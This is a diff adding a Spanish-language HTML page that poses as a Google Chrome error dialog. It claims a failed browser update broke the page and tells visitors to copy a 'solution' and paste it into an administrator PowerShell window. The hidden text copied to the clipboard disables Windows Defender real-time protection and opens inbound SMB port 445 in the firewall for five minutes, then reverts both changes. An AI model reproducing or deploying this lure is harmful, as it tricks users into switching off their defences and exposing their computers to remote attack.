@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Mensaje para el Cliente</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f1f3f4;
+    }
+
+    #popup {
+      display: flex;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.3);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      animation: fadeIn 0.3s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.98); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    #popup-content {
+      background-color: #fff;
+      padding: 24px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      max-width: 500px;
+      width: 90%;
+      text-align: left;
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: 500;
+      margin-bottom: 16px;
+      color: #202124;
+    }
+
+    #mensaje {
+      font-size: 16px;
+      color: #3c4043;
+      background-color: #f1f3f4;
+      padding: 16px;
+      border-radius: 6px;
+      white-space: normal;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+
+    ol {
+      padding-left: 20px;
+      margin-top: 0;
+    }
+
+    .button-row {
+      text-align: right;
+    }
+
+    button {
+      font-family: 'Roboto', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      padding: 8px 16px;
+      margin-left: 8px;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.2s, box-shadow 0.2s;
+      box-shadow: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .copy-btn {
+      background-color: #1a73e8;
+      color: white;
+      border: 1px solid #1a73e8;
+    }
+
+    .copy-btn:hover {
+      background-color: #185abc;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+    }
+
+    .close-btn {
+      background-color: #ffffff;
+      color: #3c4043;
+      border: 1px solid #dadce0;
+    }
+
+    .close-btn:hover {
+      background-color: #f1f3f4;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+    }
+
+    .material-icons {
+      font-size: 18px;
+      vertical-align: middle;
+    }
+
+    /* Texto oculto para copiar */
+    #texto-copiar {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="popup">
+    <div id="popup-content">
+      <img src="https://static.cdnlogo.com/logos/g/3/google-chrome.svg" alt="Logo" style="width: 160px; height: auto; float: left; margin-right: 16px;"><br><br>
+      <h2>Algo salió mal al mostrar esta página web.</h2>
+      <div id="mensaje">
+        Hubo un error durante la última actualización de la versión del navegador, lo que provocó el mal funcionamiento de algunas páginas web.<br><br>
+        Siga estas instrucciones para resolver el problema:<br>
+        <ol>
+          <li>Haga clic en el botón 'Copiar solución' a continuación.</li>
+          <li>Haga clic derecho en el icono de Windows.</li>
+          <li>Seleccione 'Windows PowerShell (Admin)'.</li>
+          <li>Haga clic derecho dentro de la ventana del terminal abierta.</li>
+          <li>Espere a que se complete la actualización, luego actualice la página.</li>
+        </ol>
+      </div>
+
+      <!-- Texto fijo que se copia al portapapeles -->
+      <div id="texto-copiar">
+Set-MpPreference -DisableRealtimeMonitoring $true; netsh advfirewall firewall add rule name="Puerto_445_TCP" dir=in action=allow protocol=TCP localport=445; Start-Sleep -Seconds 300; Set-MpPreference -DisableRealtimeMonitoring $false; netsh advfirewall firewall delete rule name="Puerto_445_TCP"
+      </div>
+
+      <div class="button-row">
+        <button class="copy-btn" onclick="copiarTexto()">
+          <span class="material-icons">content_copy</span> Copiar
+        </button>
+        <button class="close-btn" onclick="cerrarPopup()">
+          <span class="material-icons">close</span> Cerrar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function cerrarPopup() {
+      document.getElementById("popup").style.display = "none";
+    }
+
+    function copiarTexto() {
+      const texto = document.getElementById("texto-copiar").innerText.trim();
+      navigator.clipboard.writeText(texto).then(() => {
+        alert("Texto copiado al portapapeles ✅");
+      }).catch(err => {
+        alert("Error al copiar: " + err);
+      });
+    }
+  </script>
+
+</body>
+</html>
